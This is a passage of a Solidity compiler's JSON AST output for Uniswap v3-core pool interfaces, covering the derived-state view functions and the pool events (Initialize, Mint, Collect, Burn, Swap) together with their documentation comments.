									"scope": 200,
									"src": "6213:88:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 201,
							"src": "173:6130:2"
						}
					],
					"src": "45:6259:2"
				},
				"id": 2
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolDerivedState": [
							231
						]
					},
					"id": 232,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 202,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:3"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 203,
								"nodeType": "StructuredDocumentation",
								"src": "71:222:3",
								"text": "@title Pool state that is not stored\n @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n blockchain. The functions here may have variable gas costs."
							},
							"fullyImplemented": false,
							"id": 231,
							"linearizedBaseContracts": [
								231
							],
							"name": "IUniswapV3PoolDerivedState",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 204,
										"nodeType": "StructuredDocumentation",
										"src": "336:1045:3",
										"text": "@notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n you must call it with secondsAgos = [3600, 0].\n @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n timestamp"
									},
									"functionSelector": "883bdbfd",
									"id": 216,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observe",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 208,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 207,
												"mutability": "mutable",
												"name": "secondsAgos",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 216,
												"src": "1403:29:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint32_$dyn_calldata_ptr",
													"typeString": "uint32[]"
												},
												"typeName": {
													"baseType": {
														"id": 205,
														"name": "uint32",
														"nodeType": "ElementaryTypeName",
														"src": "1403:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"id": 206,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1403:8:3",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint32_$dyn_storage_ptr",
														"typeString": "uint32[]"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1402:31:3"
									},
									"returnParameters": {
										"id": 215,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 211,
												"mutability": "mutable",
												"name": "tickCumulatives",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 216,
												"src": "1481:30:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_int56_$dyn_memory_ptr",
													"typeString": "int56[]"
												},
												"typeName": {
													"baseType": {
														"id": 209,
														"name": "int56",
														"nodeType": "ElementaryTypeName",
														"src": "1481:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_int56",
															"typeString": "int56"
														}
													},
													"id": 210,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1481:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_int56_$dyn_storage_ptr",
														"typeString": "int56[]"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 214,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128s",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 216,
												"src": "1513:51:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint160_$dyn_memory_ptr",
													"typeString": "uint160[]"
												},
												"typeName": {
													"baseType": {
														"id": 212,
														"name": "uint160",
														"nodeType": "ElementaryTypeName",
														"src": "1513:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														}
													},
													"id": 213,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1513:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint160_$dyn_storage_ptr",
														"typeString": "uint160[]"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1480:85:3"
									},
									"scope": 231,
									"src": "1386:180:3",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 217,
										"nodeType": "StructuredDocumentation",
										"src": "1572:771:3",
										"text": "@notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n snapshot is taken and the second snapshot is taken.\n @param tickLower The lower tick of the range\n @param tickUpper The upper tick of the range\n @return tickCumulativeInside The snapshot of the tick accumulator for the range\n @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n @return secondsInside The snapshot of seconds per liquidity for the range"
									},
									"functionSelector": "a38807f2",
									"id": 230,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "snapshotCumulativesInside",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 222,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 219,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 230,
												"src": "2383:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 218,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2383:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 221,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 230,
												"src": "2400:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 220,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2400:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2382:34:3"
									},
									"returnParameters": {
										"id": 229,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 224,
												"mutability": "mutable",
												"name": "tickCumulativeInside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 230,
												"src": "2477:26:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 223,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "2477:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 226,
												"mutability": "mutable",
												"name": "secondsPerLiquidityInsideX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 230,
												"src": "2517:37:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 225,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "2517:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 228,
												"mutability": "mutable",
												"name": "secondsInside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 230,
												"src": "2568:20:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 227,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "2568:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2463:135:3"
									},
									"scope": 231,
									"src": "2348:251:3",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 232,
							"src": "293:2308:3"
						}
					],
					"src": "45:2557:3"
				},
				"id": 3
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
					"exportedSymbols": {
						"IUniswapV3PoolEvents": [
							350
						]
					},
					"id": 351,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 233,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 234,
								"nodeType": "StructuredDocumentation",
								"src": "71:88:4",
								"text": "@title Events emitted by a pool\n @notice Contains all events emitted by the pool"
							},
							"fullyImplemented": true,
							"id": 350,
							"linearizedBaseContracts": [
								350
							],
							"name": "IUniswapV3PoolEvents",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 235,
										"nodeType": "StructuredDocumentation",
										"src": "196:344:4",
										"text": "@notice Emitted exactly once by a pool when #initialize is first called on the pool\n @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool"
									},
									"id": 241,
									"name": "Initialize",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 240,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 237,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 241,
												"src": "562:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 236,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "562:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 239,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 241,
												"src": "584:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 238,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "584:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "561:34:4"
									},
									"src": "545:51:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 242,
										"nodeType": "StructuredDocumentation",
										"src": "602:551:4",
										"text": "@notice Emitted when liquidity is minted for a given position\n @param sender The address that minted the liquidity\n @param owner The owner of the position and recipient of any minted liquidity\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity minted to the position range\n @param amount0 How much token0 was required for the minted liquidity\n @param amount1 How much token1 was required for the minted liquidity"
									},
									"id": 258,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 257,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 244,
												"indexed": false,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 258,
												"src": "1178:14:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 243,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1178:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 246,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 258,
												"src": "1202:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 245,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1202:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 248,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 258,
												"src": "1233:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 247,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1233:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 250,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 258,
												"src": "1266:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 249,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1266:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 252,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 258,
												"src": "1299:14:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 251,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1299:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 254,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 258,
												"src": "1323:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 253,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1323:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 256,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 258,
												"src": "1348:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 255,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1348:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1168:201:4"
									},
									"src": "1158:212:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 259,
										"nodeType": "StructuredDocumentation",
										"src": "1376:493:4",
										"text": "@notice Emitted when fees are collected by the owner of a position\n @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n @param owner The owner of the position for which fees are collected\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount0 The amount of token0 fees collected\n @param amount1 The amount of token1 fees collected"
									},
									"id": 273,
									"name": "Collect",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 272,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 261,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 273,
												"src": "1897:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 260,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1897:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 263,
												"indexed": false,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 273,
												"src": "1928:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 262,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1928:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 265,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 273,
												"src": "1955:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 264,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1955:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 267,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 273,
												"src": "1988:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 266,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1988:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 269,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 273,
												"src": "2021:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 268,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2021:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 271,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 273,
												"src": "2046:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 270,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2046:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1887:180:4"
									},
									"src": "1874:194:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 274,
										"nodeType": "StructuredDocumentation",
										"src": "2074:523:4",
										"text": "@notice Emitted when a position's liquidity is removed\n @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n @param owner The owner of the position for which liquidity is removed\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity to remove\n @param amount0 The amount of token0 withdrawn\n @param amount1 The amount of token1 withdrawn"
									},
									"id": 288,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 287,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 276,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "2622:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 275,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2622:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 278,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "2653:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 277,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2653:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 280,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "2686:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 279,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2686:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 282,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "2719:14:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 281,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2719:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 284,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "2743:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 283,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2743:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 286,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "2768:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 285,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2768:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2612:177:4"
									},
									"src": "2602:188:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 289,
										"nodeType": "StructuredDocumentation",
										"src": "2796:600:4",
										"text": "@notice Emitted by the pool for any swaps between token0 and token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the output of the swap\n @param amount0 The delta of the token0 balance of the pool\n @param amount1 The delta of the token1 balance of the pool\n @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n @param liquidity The liquidity of the pool after the swap\n @param tick The log base 1.0001 of price of the pool after the swap"
									},
									"id": 305,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 304,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 291,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "3421:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 290,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3421:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 293,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "3453:25:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 292,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3453:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 295,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "3488:14:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 294,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3488:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 297,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "3512:14:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 296,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3512:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 299,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "3536:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 298,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "3536:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 301,
												"indexed": false,
												"mutability": "mutable",
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "3566:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 300,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "3566:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 303,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "3593:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 302,
													"name": "int24",
